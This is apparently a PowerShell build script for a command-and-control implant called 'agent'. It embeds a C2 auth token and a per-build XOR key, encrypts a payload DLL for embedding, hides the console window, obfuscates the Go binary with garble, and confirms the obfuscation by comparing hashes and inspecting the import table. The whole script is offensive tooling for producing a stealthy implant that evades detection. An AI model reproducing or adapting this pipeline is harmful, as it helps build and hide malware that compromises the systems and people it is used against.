param(
    [switch]$Console,
    [switch]$SkipGarble
)

$ErrorActionPreference = "Stop"

# -----------------------------------------------------------------------------
# 1. Pin Go 1.26.5 SDK (garble requires >= 1.26.2)
# -----------------------------------------------------------------------------
$GO_SDK = "C:\Users\HP\sdk\go1.26.5"
if (-not (Test-Path "$GO_SDK\bin\go.exe")) {
    Write-Host "[-] Go SDK missing at $GO_SDK"
    exit 1
}
$env:GOROOT      = $GO_SDK
$env:GOTOOLCHAIN = "local"
$env:PATH        = "$GO_SDK\bin;$env:PATH"
Write-Host "[+] Go: $(& go version)" -ForegroundColor Green

Set-Location $PSScriptRoot

# -----------------------------------------------------------------------------
# 2. C2_AUTH — prefer $env:C2_TOKEN, else generate a dev token
# -----------------------------------------------------------------------------
$c2Token = $env:C2_TOKEN
if (-not $c2Token) {
    $c2Token = "dev-" + (-join ((1..24) | ForEach-Object { "0123456789abcdef"[(Get-Random -Max 16)] }))
    Write-Host "[!] C2_TOKEN not set - using DEV token (do not ship)" -ForegroundColor Yellow
}
Write-Host "[+] C2_AUTH:  $($c2Token.Substring(0,8))... ($($c2Token.Length) chars)" -ForegroundColor Green

# -----------------------------------------------------------------------------
# 3. Fresh 32-byte XOR key per build
# -----------------------------------------------------------------------------
$keyBytes = New-Object byte[] 32
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$rng.GetBytes($keyBytes)
$xorKeyHex = -join ($keyBytes | ForEach-Object { '{0:X2}' -f $_ })
Write-Host "[+] XOR key:   $($xorKeyHex.Substring(0,16))..." -ForegroundColor Green

# -----------------------------------------------------------------------------
# 4. Encrypt libjockey.dll -> libjockey.enc with the fresh key
# -----------------------------------------------------------------------------
$plainDll = Join-Path $PSScriptRoot "..\execution_engine\build\libjockey.dll"
if (-not (Test-Path $plainDll)) {
    Write-Host "[-] libjockey.dll not found at $plainDll" -ForegroundColor Red
    exit 1
}

$plainBytes  = [System.IO.File]::ReadAllBytes($plainDll)
$cipherBytes = New-Object byte[] $plainBytes.Length
for ($i = 0; $i -lt $plainBytes.Length; $i++) {
    $cipherBytes[$i] = $plainBytes[$i] -bxor $keyBytes[$i % 32]
}
[System.IO.File]::WriteAllBytes("$PSScriptRoot\libjockey.enc", $cipherBytes)
Write-Host "[+] Encrypted: $($plainBytes.Length) -> $($cipherBytes.Length) bytes" -ForegroundColor Green

# Remove any stray plaintext DLL so it can't get embedded by mistake
Remove-Item "$PSScriptRoot\libjockey.dll" -Force -EA SilentlyContinue

# -----------------------------------------------------------------------------
# 5. Build flags
# -----------------------------------------------------------------------------
$env:CGO_ENABLED = "0"

if ($Console) {
    $plain     = "agent_console.exe"
    $garbled   = "agent_console_garbled.exe"
    $baseFlags = "-s -w"
} else {
    $plain     = "agent.exe"
    $garbled   = "agent_garbled.exe"
    $baseFlags = "-s -w -H windowsgui"
}

# Inject secrets via -X
$injectedFlags = "$baseFlags -X main.C2_AUTH=$c2Token -X main.xorKeyHex=$xorKeyHex"

# -----------------------------------------------------------------------------
# 6. Plain build
# -----------------------------------------------------------------------------
Write-Host ""
Write-Host "=== [1/3] Plain build ===" -ForegroundColor Cyan
go build -trimpath -ldflags $injectedFlags -o $plain .
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Plain build failed"
    exit 1
}
$sz = [math]::Round((Get-Item $plain).Length/1024,1)
Write-Host "[+] $plain ($sz KB)" -ForegroundColor Green

# -----------------------------------------------------------------------------
# 7. Garbled build
# -----------------------------------------------------------------------------
if (-not $SkipGarble) {
    Write-Host ""
    Write-Host "=== [2/3] Garbled build ===" -ForegroundColor Cyan

    $garbleExe = "$env:USERPROFILE\go\bin\garble.exe"
    if (-not (Test-Path $garbleExe)) {
        Write-Host "[-] garble not found: $garbleExe"
        exit 1
    }

    cmd /c "`"$garbleExe`" -literals -tiny -seed=random build -trimpath -ldflags `"$injectedFlags`" -o $garbled ."
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $garbled)) {
        Write-Host "[-] garble failed"
        exit 1
    }
    $sz2 = [math]::Round((Get-Item $garbled).Length/1024,1)
    Write-Host "[+] $garbled ($sz2 KB)" -ForegroundColor Green

    $h1 = (Get-FileHash $plain   -Algorithm SHA256).Hash
    $h2 = (Get-FileHash $garbled -Algorithm SHA256).Hash
    Write-Host ""
    Write-Host "=== Hash comparison ===" -ForegroundColor Cyan
    Write-Host "  plain:   $h1"
    Write-Host "  garbled: $h2"
    if ($h1 -ne $h2) {
        Write-Host "  [+] Hashes differ - obfuscation applied" -ForegroundColor Green
    } else {
        Write-Host "  [!] Hashes identical" -ForegroundColor Yellow
    }
}

# -----------------------------------------------------------------------------
# 8. Import table
# -----------------------------------------------------------------------------
Write-Host ""
Write-Host "=== [3/3] Import table ===" -ForegroundColor Cyan
if ($SkipGarble) { $target = $plain } else { $target = $garbled }
objdump -p $target | Select-String "DLL Name"

Write-Host ""
Write-Host "[+] Build complete." -ForegroundColor Cyan
Write-Host "[+] C2_AUTH prefix: $($c2Token.Substring(0,8))..." -ForegroundColor Cyan
Write-Host "[+] XOR key prefix: $($xorKeyHex.Substring(0,16))..." -ForegroundColor Cyan